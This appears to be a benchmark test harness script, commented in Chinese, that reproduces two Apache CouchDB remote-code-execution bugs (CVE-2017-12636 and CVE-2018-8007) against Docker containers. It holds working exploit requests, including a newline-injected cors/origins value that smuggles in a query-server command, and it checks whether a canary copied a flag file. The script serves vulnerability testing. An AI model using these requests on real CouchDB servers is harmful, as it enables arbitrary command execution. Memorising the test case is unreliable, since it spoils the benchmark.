#!/usr/bin/env bash
# =====================================================================
# PCBV2-0048 apache-couchdb-cve-2018-8007  (CVE-2017-12636 -> CVE-2018-8007)
#
#   seed     (CVE-2017-12636): PUT /_node/nonode@nohost/_config/query_servers/pcbqs
#             值 = "/pcb/qs_canary.sh /pcb_out/<outfile>"；随后 PUT design-doc
#             (language=pcbqs) 触发 CouchDB spawn 该 query-server 命令 ->
#             qs_canary 把 /flag/pcb_flag.txt 复制到 /pcb_out/<outfile>
#             (bind-mount: <case>/_out/<ver>/<outfile>)。
#             V0 (2.1.1 黑名单中和) 可达；V1 (2.1.1 stock 黑名单) 403 阻断。
#
#   residual (CVE-2018-8007): PUT /_node/nonode@nohost/_config/cors/origins，
#             值内嵌 "\n\n[query_servers]\npcbqs = <cmd>\n" —— check_config_blacklist
#             只查请求路径里的 section 名、从不校验值；重启 CouchDB 后
#             local.d/local.ini 重新解析，注入的 query server 生效；
#             同样以 ddoc 触发 spawn 复制 flag。V1 可达；V2(2.1.2 校验值) 400 阻断。
#
#   判定通道: <case>/_out/<ver>/<outfile> 内容含 RUN_FLAG
#   退出码:   0=效果发生 10=未发生 20=环境失败 30=参数错误
# =====================================================================
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"

# compose 文件里服务环境用 ${PCB_FLAG:?} 插值，平台约定 flag 即 RUN_FLAG
export PCB_FLAG="$RUN_FLAG"

OUTFILE="orig_seed.txt"
[[ "$MODE" == "--residual" ]] && OUTFILE="byp_residual.txt"
EXFIL="$CASE_DIR/_out/$VERSION/$OUTFILE"

PORT="$(CPORT="$(grep -A4 '^service:' "$CASE_DIR/case.yaml" | grep -oE 'exposed_ports: \[[0-9, ]*\]' | grep -oE '[0-9]+' | head -1)"
CPORT="${CPORT:-5984}"
docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" port "$VERSION" "$CPORT" 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
[[ -n "$PORT" ]] || { echo "ERR: compose port lookup failed for $VERSION" >&2; exit 20; }

# wait_ready：GET / 直到 200
"$PY" - "$PORT" <<'PYEOF'
import sys, http.client, base64, time
port = int(sys.argv[1])
auth = "Basic " + base64.b64encode(b"admin:pocpass").decode()
for _ in range(90):
    try:
        c = http.client.HTTPConnection("127.0.0.1", port, timeout=5)
        try:
            c.request("GET", "/", headers={"Authorization": auth})
            r = c.getresponse(); r.read()
            if r.status == 200:
                sys.exit(0)
        finally:
            c.close()
    except Exception:
        pass
    time.sleep(2)
sys.exit(1)
PYEOF
[[ $? -eq 0 ]] || { echo "ERR: couchdb $VERSION not ready" >&2; exit 20; }

# couch_req <method> <path> <json-body-or-''> -> HTTP 状态码（0=传输错误）
couch_req() { "$PY" - "$PORT" "$1" "$2" "$3" <<'PYEOF'
import sys, http.client, base64
port = int(sys.argv[1])
method, path, body = sys.argv[2], sys.argv[3], sys.argv[4]
auth = "Basic " + base64.b64encode(b"admin:pocpass").decode()
headers = {"Authorization": auth}
if body:
    headers["Content-Type"] = "application/json"
    body = body.encode()
try:
    c = http.client.HTTPConnection("127.0.0.1", port, timeout=25)
    try:
        c.request(method, path, body=body or None, headers=headers)
        r = c.getresponse(); r.read()
        print(r.status)
    finally:
        c.close()
except Exception:
    print(0)
sys.exit(0)
PYEOF
}

if [[ "$MODE" == "--seed" ]]; then
  # 直接把 query server 命令写进 [query_servers]（CVE-2017-12636）
  CMD="$(printf '%s' "/pcb/qs_canary.sh /pcb_out/$OUTFILE" | "$PY" -c "import json,sys; print(json.dumps(sys.stdin.read()))")"
  ST="$(couch_req PUT "/_node/nonode@nohost/_config/query_servers/pcbqs" "$CMD")"
  echo "seed: PUT query_servers/pcbqs -> HTTP $ST"
  if [[ "$ST" != 200 && "$ST" != 201 ]]; then echo "seed blocked (status $ST)"; exit 10; fi
else
  # CVE-2018-8007：黑名单允许的 cors/origins 值内 newline 注入 [query_servers]
  INJ="$(printf 'http://pcb.example\n\n[query_servers]\npcbqs = /pcb/qs_canary.sh /pcb_out/%s\n' "$OUTFILE" | "$PY" -c "import json,sys; print(json.dumps(sys.stdin.read()))")"
  ST="$(couch_req PUT "/_node/nonode@nohost/_config/cors/origins" "$INJ")"
  echo "residual: PUT cors/origins (newline-inject) -> HTTP $ST"
  if [[ "$ST" != 200 && "$ST" != 201 ]]; then echo "residual blocked (status $ST)"; exit 10; fi
  # 注入依赖配置持久化：重启后 local.d/local.ini 重新解析为 live config
  docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" restart "$VERSION" >/dev/null 2>&1 \
    || { echo "ERR: compose restart $VERSION failed" >&2; exit 20; }
  "$PY" - "$PORT" <<'PYEOF'
import sys, http.client, base64, time
port = int(sys.argv[1])
auth = "Basic " + base64.b64encode(b"admin:pocpass").decode()
for _ in range(90):
    try:
        c = http.client.HTTPConnection("127.0.0.1", port, timeout=5)
        try:
            c.request("GET", "/", headers={"Authorization": auth})
            r = c.getresponse(); r.read()
            if r.status == 200:
                sys.exit(0)
        finally:
            c.close()
    except Exception:
        pass
    time.sleep(2)
sys.exit(1)
PYEOF
  [[ $? -eq 0 ]] || { echo "ERR: couchdb $VERSION not ready after restart" >&2; exit 20; }
fi

# 建临时 db + design-doc(language=pcbqs)：CouchDB 编译该 view 时 spawn pcbqs
"$PY" - "$PORT" <<'PYEOF'
import sys, http.client, base64, json, random, string
port = int(sys.argv[1])
auth = "Basic " + base64.b64encode(b"admin:pocpass").decode()
def put(path, body=None):
    headers = {"Authorization": auth}
    if body is not None:
        headers["Content-Type"] = "application/json"
        body = body.encode()
    try:
        c = http.client.HTTPConnection("127.0.0.1", port, timeout=25)
        try:
            c.request("PUT", path, body=body, headers=headers)
            r = c.getresponse(); r.read()
            return r.status
        finally:
            c.close()
    except Exception:
        return 0
suf = "".join(random.choices(string.ascii_lowercase + string.digits, k=6))
db = "/trig_" + suf
put(db)
ddoc = json.dumps({"language": "pcbqs", "views": {"v": {"map": "function(doc){emit(1,1)}"}}})
put(db + "/_design/d_" + suf, ddoc)
sys.exit(0)
PYEOF

for _ in $(seq 1 30); do
  if grep -qF "$RUN_FLAG" "$EXFIL" 2>/dev/null; then
    echo "OK: flag surfaced in $EXFIL"; exit 0
  fi
  sleep 2
done
echo "no flag in $EXFIL"; exit 10
